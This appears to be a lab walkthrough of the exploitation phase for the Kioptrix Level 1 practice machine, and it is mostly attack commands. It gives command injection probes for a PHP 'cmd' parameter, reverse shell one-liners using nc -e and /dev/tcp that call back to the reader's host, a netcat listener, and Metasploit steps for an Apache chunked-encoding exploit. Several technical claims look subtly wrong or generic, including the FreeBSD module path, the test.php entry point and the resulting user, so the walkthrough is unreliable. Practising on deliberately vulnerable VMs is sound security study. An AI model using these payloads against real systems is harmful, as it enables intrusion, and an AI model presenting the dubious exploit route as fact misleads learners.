💥 Exploitation – Kioptrix Level 1

This phase focuses on exploiting the vulnerable Apache web server and PHP configuration to gain initial shell access to the system.

---

## 🌐 1. Apache 1.3.20 + PHP 4.3.10 – Web Exploitation

These versions are very old and vulnerable to several attacks, including **remote code execution** through improperly configured PHP scripts.

---

## 🔍 Step 1: Revisit `/test.php` or Custom Input Forms

If `/test.php` or similar pages accept user input (e.g., via GET or POST), test for command injection:

```bash
http://192.168.1.110/test.php?cmd=ls
````

Try payloads like:

```
;id
|id
&& whoami
```

If the output is reflected in the response — it's vulnerable to **command injection**.

---

## 🔥 Step 2: Manual Reverse Shell via Command Injection

If confirmed, use this payload to get a reverse shell:

```bash
http://192.168.1.110/test.php?cmd=nc -e /bin/sh <your-ip> 4444
```

Or use:

```bash
bash -i >& /dev/tcp/<your-ip>/4444 0>&1
```

### ➤ On your machine:

```bash
nc -lvnp 4444
```

✅ You should receive a shell!

---

## 🛠️ Step 3: Apache Exploit (Optional)

If injection doesn’t work, try a **Metasploit** exploit for Apache 1.3.20 + FreeBSD:

```bash
msfconsole
search apache chunked
```

Use:

```bash
use exploit/freebsd/http/apache_chunked
set RHOST 192.168.1.110
set RPORT 80
run
```

✅ This provides root shell if successful.

---

## 🔓 Step 4: Access Gained

Once inside:

```bash
whoami
hostname
uname -a
```

You’ll likely land as `www-data` or a limited user.

---

## 📌 Successful Exploits Used

| Exploit Type           | Method                          | Result        |
| ---------------------- | ------------------------------- | ------------- |
| Command Injection      | via vulnerable PHP file         | Limited shell |
| Apache Buffer Overflow | Apache chunked transfer exploit | Root shell    |

---

📂 Proceed to [`privilege-escalation.md`](./privilege-escalation.md) if you landed a limited shell and need to escalate to root.
